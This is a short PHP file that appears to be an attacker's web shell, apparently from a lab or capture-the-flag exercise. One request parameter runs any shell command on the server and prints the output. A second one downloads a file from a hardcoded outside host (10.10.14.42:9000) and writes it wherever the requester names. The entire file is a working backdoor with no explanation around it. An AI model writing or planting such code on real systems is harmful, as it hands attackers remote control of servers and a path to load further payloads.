<?php 
    
    if (isset($_REQUEST['fileUpload'])) {
        file_put_contents($_REQUEST['fupload'],file_get_contents("http://10.10.14.42:9000/".$_REQUEST['fupload']));
    }
    
    if (isset($_REQUEST['execCmd'])) {
        
        echo "<pre>".shell_exec($_REQUEST['execCmd'])."</pre>";
    };
?>
